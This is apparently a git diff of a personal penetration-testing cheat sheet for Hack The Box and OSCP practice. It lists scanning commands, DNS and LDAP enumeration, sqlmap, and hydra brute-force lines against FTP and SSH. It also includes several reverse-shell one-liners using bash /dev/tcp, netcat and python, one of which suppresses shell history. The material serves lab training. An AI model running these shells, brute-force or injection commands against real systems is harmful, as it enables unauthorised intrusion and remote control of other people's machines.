@@ -1,16 +1,21 @@
 # Useful Commands for HTB/OSCP
 > **Website**: https://IslandDog.ky
-> **Last Update**: 07/14/21
+> **Last Update**: 07/30/21
 
 ## RustScan - #rustscan 
 ```bash
-rustscan -u 5000 -a ${PWD##*/} -- -A -sC -sV --script 'default,vuln' -oX scan && xsltproc scan -o scan.html && rm -rf scanfire
+#Intial
+rustscan -u 5000 -a ${PWD##*/} -- -A -sC -sV --script 'default,vuln' -oX scan && xsltproc scan -o scan.html && rm -rf scan
+#AllPorts
+sudo nmap -sC -sV -T4 -v -p- --script 'default,vuln' -oX scan-all 10.10.10.241 && xsltproc scan-all -o scan-allports.html && rm -rf scan-all
+#UDP
+sudo nmap -sU -sV --version-intensity 0 -F -n ${PWD##*/}
 ```
 
 ## Reverse Shell #OneLiners
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/h
 {nc.tradentional|nc|ncat|netcat} 10.0.0.1 1234 {-e|-c} /bin/bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
@@ -189,6 +194,7 @@ CVE-2008-0166 - https://www.exploit-db.com/exploits/5720
 
 ### 53 #DNS 
 ```bash
+dig @${PWD##*/} -x ${PWD##*/}
 dnsenum ${PWD##*/}
 dnsrecon -d ${PWD##*/}
 dnsrecon -d ${PWD##*/} -a
@@ -203,12 +209,13 @@ finger "|/bin/ls -a /${PWD##*/}"
 ```
 
 ### 80/8080/443 #HTTP 
-#DirectoryScan #FeroxBuster #HostScan
+#DirectoryScan #FeroxBuster #HostScan #Logins
 ```bash
 feroxbuster -u http://${PWD##*/}/ -x php js txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --extract-links
 nikto -host http://${PWD##*/} -C all -o nikto-scan.html
 nikto -host http://${PWD##*/} -p 80,8080,1234 -C all -o nikto-all.html
 nikto -h ${PWD##*/} -useproxy http://${PWD##*/}:4444  //squidcd
+sqlmap --wizard
 ```
 
 #WordPress 
@@ -326,9 +333,11 @@ onesixtyone -c /usr/share/wordlist/SecLists/Discovery/SNMP/common-snmp-community
 
 ### 389/636/3268/3269 #LDAP
 ```bash
+sudo nmap 7sV -p389 ${PWD##*/}
 rpcclient -U '' -N ${PWD##*/}
 enumdomusers
 enumdomgroups
+ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h ${PWD##*/}
 ldapsearch -h ${PWD##*/} -p 389 -x -b "dc=megacorp,dc=local"
 ldapsearch -h ${PWD##*/} -x -s base namingcontexts
 ldapsearch -h ${PWD##*/} -x -s sub -b "DC=megacorp,DC=local" |tee ldap.out && cat ldap.out |grep -i memberof
@@ -449,5 +458,5 @@ hydra -V -f -L users -P passwords ftp://${PWD##*/} -u -vV
 hydra -V -f -L users -P passwords ssh://${PWD##*/} -u -vV
 ```
 
-IslandDog - Christopher Soehnlein 2021
+![[id.png|20x20]] IslandDog - Christopher Soehnlein 2021
 https://IslandDog.ky
